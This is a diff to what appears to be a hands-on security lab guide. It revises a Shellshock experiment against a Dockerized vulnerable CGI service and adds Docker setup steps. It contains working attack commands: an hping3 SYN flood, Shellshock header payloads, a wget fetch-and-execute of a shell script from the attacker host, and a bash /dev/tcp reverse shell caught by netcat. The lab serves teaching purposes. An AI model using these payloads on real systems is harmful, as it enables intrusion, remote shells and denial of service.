@@ -465,12 +465,39 @@ sudo iptables -L -v -n
 # Re-run the exact same hping3 command after the server's defenses are in place
 sudo hping3 -S --flood -V --rand-source 192.168.10.12 -p 80
 ```
-
 ### **Experiment 6: Shellshock - Remote Code Execution via CGI**
 
 ---
 
-#### **Server: Build and Deploy Vulnerable Service**
+#### **Server: Docker Installation & Service Deployment**
+
+##### **1. Install Docker**
+
+```bash
+# Update package lists, install prerequisites, and stop nginx if it is running
+sudo apt-get update
+sudo apt-get install -y ca-certificates curl gnupg
+sudo systemctl stop nginx
+
+# Add Docker’s official GPG key
+sudo install -m 0755 -d /etc/apt/keyrings
+sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
+sudo chmod a+r /etc/apt/keyrings/docker.asc
+
+# Set up the Docker repository
+# **IMPORTANT** Ensure this is all on one line
+echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+
+# Install Docker Engine
+sudo apt-get update
+sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
+
+# Add your user to the 'docker' group to run commands without sudo
+sudo usermod -aG docker $USER
+# NOTE: You must log out and log back in for this change to take effect.
+```
+
+##### **2. Build and Deploy Vulnerable Service**
 
 ```bash
 # Create a project directory and navigate into it
@@ -500,12 +527,10 @@ sudo docker run --rm -d -p 8080:80 --name vulnerable-apache my-shellshock-lab
 # Install discovery tools
 sudo apt install -y dirb nmap
 
-# Scan the server for open ports and services
-# The vulnerable service should be found on port 8080
+# Scan the server for open ports and services on the vulnerable port
 sudo nmap -sS -sV -p 8080 192.168.10.12
 
 # Discover web content, specifically looking for CGI scripts
-# Target port 8080 where the service is running
 dirb http://192.168.10.12:8080
 ```
 
@@ -516,13 +541,12 @@ dirb http://192.168.10.12:8080
 ```bash
 # Send a payload that instructs the server to create a file in /tmp
 # A '500 Internal Server Error' is the expected response
-curl -H 'User-Agent: () { :;}; /usr/bin/touch /tmp/pwned' \
-http://192.168.10.12:8080/cgi-bin/vulnerable.sh
+curl -H 'User-Agent: () { :;}; /usr/bin/touch /tmp/pwned' http://192.168.10.12:8080/cgi-bin/vulnerable.sh
 ```
 
 ---
 
-#### **Server: Verify Proof of Concept**
+#### **Server: Verify Exploit**
 
 ```bash
 # Check inside the running Docker container for the file created by the exploit
@@ -532,7 +556,7 @@ sudo docker exec vulnerable-apache ls /tmp
 
 ---
 
-#### **Attacker: Exploitation (Gaining a Reverse Shell)**
+#### **Attacker: Gaining a Reverse Shell**
 
 *This multi-stage attack requires three separate terminals on the Attacker node.*
 
@@ -548,8 +572,7 @@ echo '/bin/bash -i >& /dev/tcp/192.168.10.11/4444 0>&1' >> shell.sh
 curl -H 'User-Agent: () { :;}; /usr/bin/wget http://192.168.10.11:8000/shell.sh -O /tmp/shell.sh' http://192.168.10.12:8080/cgi-bin/vulnerable.sh
 
 # Stage 2: Trigger the vulnerability again to execute the downloaded script
-curl -H 'User-Agent: () { :;}; /bin/bash /tmp/shell.sh' \
-http://192.168.10.12:8080/cgi-bin/vulnerable.sh
+curl -H 'User-Agent: () { :;}; /bin/bash /tmp/shell.sh' http://192.168.10.12:8080/cgi-bin/vulnerable.sh
 
 # --- Terminal 2: Start a web server to host the payload ---
 # Leave this running in the foreground
@@ -564,15 +587,16 @@ nc -lvnp 4444
 
 #### **Attacker: Verify Reverse Shell**
 
-*After executing Stage 2, your listener terminal (Terminal 3) should show a new connection.*
+*After executing Stage 2, your listener terminal (Terminal 3) should show a new connection and provide a shell prompt.*
 
 ```bash
-# The netcat listener will show a connection and provide a shell prompt
+# Example output from the netcat listener:
+# listening on [any] 4444 ...
+# connect to [192.168.10.11] from (UNKNOWN) [192.168.10.12] 45912
+#
 # You can now run commands on the server as the 'www-data' user
 $ whoami
 www-data
-$ ls -la /
-...
 ```
 
 ### **Experiment 7: Malware Emulation and Detection**
